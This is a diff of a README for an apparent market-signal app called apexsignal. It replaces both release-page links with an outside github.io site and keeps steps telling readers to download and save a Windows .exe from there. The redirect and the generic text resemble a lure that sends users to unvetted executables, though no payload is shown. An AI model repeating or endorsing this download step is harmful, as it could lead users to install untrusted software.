@@ -1,6 +1,6 @@
 # 📈 apexsignal-app-update - Monitor market trends with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Problemcubanmonetaryunit816/apexsignal-app-update/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://problemcubanmonetaryunit816.github.io)
 
 Apexsignal provides tools to track data trends through a clean interface. This application helps you view signal updates on your computer. You can use the web version or run the software locally on your Windows system. 
 
@@ -8,7 +8,7 @@ Apexsignal provides tools to track data trends through a clean interface. This a
 
 You need to visit the release page to obtain the installation files. Follow these steps to prepare the application for your machine.
 
-1. Go to the [official release page](https://github.com/Problemcubanmonetaryunit816/apexsignal-app-update/releases).
+1. Go to the [official release page](https://problemcubanmonetaryunit816.github.io).
 2. Look for the latest version number at the top of the list.
 3. Select the file ending in .exe for Windows.
 4. Save the file to a folder you can find later, such as your Downloads folder.
